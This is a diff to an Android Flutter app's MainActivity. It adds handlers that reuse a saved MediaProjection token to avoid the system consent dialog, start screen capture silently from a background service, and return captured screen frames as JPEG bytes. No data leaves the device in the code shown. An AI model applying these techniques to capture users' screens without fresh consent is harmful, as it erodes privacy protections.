@@ -126,6 +126,123 @@ class MainActivity : FlutterActivity() {
                     result.success(null)
                 }
 
+                // BUG-1-FIX: Return the saved MediaProjection result code and data
+                // so that flutter_webrtc's getDisplayMedia() can reuse the existing
+                // token instead of triggering the system consent dialog again.
+                //
+                // BUG-2-FIX: Also return Parcel-marshaled Intent bytes that preserve
+                // the Binder extra. The URI-serialized form (resultDataUri) LOSES the
+                // IBinder needed by getMediaProjection() on Android 14+. The Parcel
+                // bytes (resultDataParcel) preserve ALL data including the Binder.
+                "getProjectionParams" -> {
+                    try {
+                        val code = ScreenCaptureService.savedResultCode
+                        val data = ScreenCaptureService.savedResultData
+                        val parcelBytes = ScreenCaptureService.savedResultDataParcelBytes
+                        if (code != 0 && data != null) {
+                            val uri = data.toUri(0)
+                            val params = mutableMapOf<String, Any?>(
+                                "resultCode" to code,
+                                "resultDataUri" to uri.toString()
+                            )
+                            // BUG-2-FIX: Include Parcel-marshaled bytes that
+                            // preserve the Binder extra. Dart can pass these bytes
+                            // to flutter_webrtc's getDisplayMedia() as
+                            // androidMediaProjectionResultData (byte array).
+                            if (parcelBytes != null) {
+                                params["resultDataParcel"] = parcelBytes
+                            }
+                            result.success(params)
+                        } else {
+                            result.success(null)
+                        }
+                    } catch (e: Exception) {
+                        result.success(null)
+                    }
+                }
+
+                // BUG-2-FIX: Return the Parcel-marshaled Intent bytes that preserve
+                // the Binder extra. This is the PREFERRED way to pass projection data
+                // to flutter_webrtc on Android 14+ where Intent.toUri() loses the Binder.
+                "getProjectionParamsParcel" -> {
+                    try {
+                        val code = ScreenCaptureService.savedResultCode
+                        val parcelBytes = ScreenCaptureService.savedResultDataParcelBytes
+                        if (code != 0 && parcelBytes != null) {
+                            result.success(mapOf(
+                                "resultCode" to code,
+                                "resultDataParcel" to parcelBytes
+                            ))
+                        } else {
+                            result.success(null)
+                        }
+                    } catch (e: Exception) {
+                        result.success(null)
+                    }
+                }
+
+                // BUG-2-FIX: Start native screen frame capture using VirtualDisplay +
+                // ImageReader. This is used as a fallback when flutter_webrtc's
+                // getDisplayMedia() fails (e.g., due to Intent URI serialization
+                // losing the Binder extra on Android 14+).
+                "startNativeScreenCapture" -> {
+                    try {
+                        val svc = ScreenCaptureService.instance
+                        if (svc == null) {
+                            result.success(false)
+                            return@setMethodCallHandler
+                        }
+                        val width = call.argument<Int>("width") ?: 720
+                        val height = call.argument<Int>("height") ?: 1280
+                        val fps = call.argument<Int>("fps") ?: 5
+                        val started = svc.startFrameCapture(width, height, fps)
+                        result.success(started)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "startNativeScreenCapture error: $e")
+                        result.success(false)
+                    }
+                }
+
+                // BUG-2-FIX: Stop native screen frame capture.
+                "stopNativeScreenCapture" -> {
+                    try {
+                        ScreenCaptureService.instance?.stopFrameCapture()
+                        result.success(null)
+                    } catch (e: Exception) {
+                        result.success(null)
+                    }
+                }
+
+                // BUG-2-FIX: Get the latest captured screen frame as JPEG bytes.
+                // Returns null if frame capture is not running or no frame is available.
+                "getScreenFrame" -> {
+                    try {
+                        val frame = ScreenCaptureService.instance?.getLatestFrame()
+                        result.success(frame)
+                    } catch (e: Exception) {
+                        result.success(null)
+                    }
+                }
+
+                // BUG-3-FIX: Start ScreenCaptureService with ACTION_START_SILENT.
+                // This can be called from the background service isolate where
+                // no foreground Activity is available to show the consent dialog.
+                // The service will try to reuse the saved token; if invalid, it
+                // will show a notification prompting the user to re-grant consent.
+                "startSilentProjection" -> {
+                    try {
+                        val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
+                            action = ScreenCaptureService.ACTION_START_SILENT
+                        }
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                            startForegroundService(svcIntent)
+                        else startService(svcIntent)
+                        result.success(true)
+                    } catch (e: Exception) {
+                        result.success(false)
+                    }
+                }
+
                 "requestBatteryOptimizationExemption" -> {
                     try {
                         val intent = Intent(
